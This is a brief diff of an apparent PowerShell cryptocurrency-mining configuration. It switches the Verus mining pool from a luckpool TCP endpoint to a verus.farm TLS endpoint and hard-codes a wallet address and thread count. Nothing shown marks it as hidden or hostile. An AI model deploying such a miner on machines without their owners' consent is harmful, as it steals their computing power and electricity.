@@ -1,6 +1,6 @@
 $threads = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
 $algorithm = "verus"
-$server = "stratum+tcp://eu.luckpool.net:3960"
+$server = "stratum+tls://verus.farm:9998"
 $user = "RHACKERwSVgjTvV4vNiTjmrkLTD7a92ALD.Triage"
 $password = "x"
 
